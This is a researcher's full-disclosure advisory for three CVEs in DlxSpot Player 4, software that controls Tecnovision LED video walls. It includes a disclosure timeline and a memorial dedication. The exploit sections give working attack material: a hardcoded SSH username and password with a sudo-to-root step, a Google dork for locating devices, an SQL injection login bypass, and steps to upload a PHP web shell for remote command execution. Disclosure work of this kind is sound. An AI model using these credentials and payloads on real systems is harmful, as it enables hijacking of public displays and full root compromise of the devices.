Tecnovision LED Video Wall Vulnerabilities and Exploits. From SQLi to full root access.
================================
##### Introduction:
Tecnovision is a manufacturer of LED Video Walls used in arenas (For example, Twickenham Stadium), concert halls, shopping malls, as roadsigns and much much more. DlxSpot Player 4 is the software controller for some of these LED walls. These are the unpatched exploits that I have discovered that led (ha!) from SQLi to full root access. (Please note that the hardcoded password was the last finding, they are just sorted in this list by the CVE numbers assigned to them)
Thank you for taking the time to read this. If you've got any questions, ping me on twitter @unknownpwn

I'd like to dedicate this work to my friend and brother-in-law who recently passed away, **Marcus Åström.**
May you rest in peace. 1994-04-05 ✞ 2017-09-11

##### TIMELINE:

+ 2017-05-14 - Discovery of vulnerabilities.
+ 2017-05-15 - Contacted Tecnovision through contact form on manufacturer homepage. 
+ 2017-06-01 - No response, tried contacting again through several contact forms on homepage.
+ 2017-08-10 - Contacted Common Vulnerabilities and Exposures (CVE) requesting CVE assignment.
+ 2017-08-17 - Three CVE's assigned for the vulnerabilities found.
+ 2017-08-22 - With help from fellow hacker and friend, byt3bl33d3r, sent an email in Italian to the company. 
+ 2017-09-18 - No response, full public disclosure.

### 1. Hardcoded Root SSH Password.
``` 
# Exploit Title: DlxSpot - Player4 LED video wall - Hardcoded Root SSH Password.
# Google Dork: "DlxSpot - Player4"
# Date: 2017-05-14
# Discoverer: Simon Brannstrom 
# Authors Website: https://unknownpwn.github.io/ 
# Vendor Homepage: http://www.tecnovision.com/
# Software Link: n/a
# Version: All known versions
# Tested on: Linux
# About: DlxSpot is the software controlling Tecnovision LED Video Walls all over the world, they are used in football arenas, concert halls, shopping malls, as roadsigns etc.
# CVE: CVE-2017-12928
# Linked CVE's: CVE-2017-12929, CVE-2017-12930
``` 

> Hardcoded password for all DlxSpot Players 4, accessible via SSH at port 22 as default. 
> Root login is disabled.

username: `dlxuser`
password: `tecn0visi0n`
 
After logging in, `sudo su` with the same password to escalate privileges to root.

-----------------------------------------

### 2. Admin Interface SQL Injection
```
# Exploit Title: DlxSpot - Player4 LED video wall - Admin Interface SQL Injection
# Google Dork: "DlxSpot - Player4"
# Date: 2017-05-14
# Discoverer: Simon Brannstrom
# Authors Website: https://unknownpwn.github.io/
# Vendor Homepage: http://www.tecnovision.com/
# Software Link: n/a
# Version: >1.5.10
# Tested on: Linux
# About: DlxSpot is the software controlling Tecnovision LED Video Walls all over the world, they are used in football arenas, concert halls, shopping malls, as roadsigns etc.
# CVE: CVE-2017-12930
# Linked CVE's: CVE-2017-12928, CVE-2017-12929
```

> DlxSpot Player 4 above version 1.5.10 suffers from an SQL injection vulnerability in the admin interface and is exploitable > with the following injection.

username:`admin` 
password:`x' or 'x'='x`

-----------------------------------------

### 3. Arbitrary File Upload to RCE
```
# Exploit Title: DlxSpot - Player4 LED video wall - Arbitrary File Upload to RCE
# Google Dork: "DlxSpot - Player4"
# Date: 2017-05-14
# Discoverer: Simon Brannstrom
# Authors Website: https://unknownpwn.github.io/ 
# Vendor Homepage: http://www.tecnovision.com/
# Software Link: n/a
# Version: >1.5.10
# Tested on: Linux
# About: DlxSpot is the software controlling Tecnovision LED Video Walls all over the world, they are used in football arenas, concert halls, shopping malls, as roadsigns etc.
# CVE: CVE-2017-12929
# Linked CVE's: CVE-2017-12928, CVE-2017-12930.
```

> DlxSpot Player 4 - Unrestricted Arbitrary File Upload in `resource.php` leading to Remote Command Execution.

1. Visit http://host/resource.php and upload PHP shell. For example: `<?php system($_GET["c"]); ?>`
2. RCE via http://host/resource/source/shell.php?c=id
3. Output: `www-data`

```
MMMMMMMMWXd;'  .xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXc..,cdKWMMMMMMMM
MMMMMMMXd:;.    ,0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNl    .;cdKWMMMMMM
MMMMMWO;.;,   .  :XMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWd.     ':';xWMMMMM
MMMMWx.',;'  'c.  oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk.  :;  .,;,.oNMMMM
MMMWd..l,''  .:'  .dWMMMMMMWWWXNMMMMMMNNWWWMMMMMMWk.  .:,  .,'l,.oNMMM
MMWk,;lc.., ..,;   .dNMMMMXdkO:xMMMMMWxc0kxNMMMMWk.   ,,.. ''.:o,.dWMM
MMXodxc' .,....;'   .lXMMWd';,.cXMMMMK:.;;'xWMMXo.   .;... ,. 'lxdl0MM
MXkoo;'.  ;,'' ';..   'dKk,....;0MMMMO'....;OXx,    .;' .'':. .,:xdONM
Nl';;...  :l:;,. ',..   .'..'..cONWWXO:.''..,.    .,'.',::lc. .'.:c;lX
0l;,'... .'l:.......'....      .;0WWk'.       ...'.....'.cl,. ...';;:k
Kx;.. .. ..', .,;,....'','.....,OWMMNd......',''....,:'..;,.. .. .':kK
x:... .. ...' .. ,l;.'. .. ...lKMMMMMWO:.'. .. ...:l'....,... .. ...ck
:,..  .. ...,... ..';,,''..,;;OWMMMMMMNo,:' .,',;;''. ...,... .. ...,c
,'.'. .. .. .',,.'..,.''..'..lNMMMMMMMM0;.''..;.., ...,''...  .. .'.',
c',c. .. .. .;c;':,.:'....;::xXMMMMMMMMOl;;,....;:.;,'cc, ..  '. .l'':
k;,,. .'. ...;'';::,,,.',;OXNWWMMMMMMMMWNX0l',..:,,lc;':, .. .'  .c,;k
k:'..  ;, ...;..,.'ll:ckkxXMMMMMMMMMMMMMMMWkdxo::l:',,.'; .. ,,  .'':O
0c..'  lo...'c.'c..kNOxXMWWMMMM R I P MMMMWNWWOx0K: ;:.;:....o; .'.'l0
Xl..;. o0;.':o,.dc.kMWNWMMMMMMMMMMMMMMMMMMMMMWNNMX:.d:.lc'. c0; ', .xX
Wl ,k:.ckd..oOc.o0cdWMMMMMMM M A R C U S MMMMMMMM0:dO'.xx:.,kO, ll..kM
Nc.okl,::ol'cxd,;KK0WMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OXd.ckx;'dol,,kk,.xM
Nc;c.:ol..loc:dx:kMWMMMMMMM  A S T R O M  MMMMMMWWXccklccoc.:ll:ll'xMM
Noc' .oo' .lo':KO0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKxKo,lkc  lk: .::kM
NOx' .',,  ..  .dWMMMM 1994-04-05 ✞ 2017-09-11 MMMMWWO' ';. .::'  cdOM
WN0, ,;.,. ... .OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX:  .. .;.., .dKXM
MMN: lx..;. .,. ,0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXc  ''  ,,.co..OWWM
MMWd'lk:.':. 'c' ,0WMMMMMMM FOREVER LOVED MMMMMMMMXc .:;  ;;.'kx.:XMMM
MMW0dlcc,.;l. ,xd,;OWMMMMM NEVER FORGOTTEN MMMMMW0:.cd: .::..cdocxWMMM
MMNo;,:;';'co' 'kXkkXMMMMMMMMMMMMMMMMMMMMMMMMMMMXxx0O; .ll',;::cokNMMM
MMX: .l: .,co:'..dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWk'.'ldc;'.:c. :XMMM
MM0' 'Ol   cl..;:,lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo,,,.'oc.  ox. ;KMMM
MWd..xNl  .lc  ,0KdxXMMMMMMMMMMMMMMMMMMMMMMMMMMWKdo0k'  lc   dXc .OMMM
WO;:OWNc  .kd  .OMMNNWMMMMMMMMMMMMMMMMMMMMMMMMMWXNWMx. .xd.  oWXc.cXMM
WK0NMMK,  cNx. 'OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMx. '00'  lNMNOd0WM
MMMMMMk. ,0Mk. ;KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMk. ,KWo. ;KMMMMMMM
MMMMMNc 'OWMk..dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK; ;XMXc .kMMMMMMM
MMMMMk';0WMMk':XMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWx.;XMMXc.cNMMMMMM
MMMMXddXMMMM0xKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdoNMMMNd:OMMMMMM
MMMMNXWMMMMMWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNXWMMMMWOkNMMMMM
```
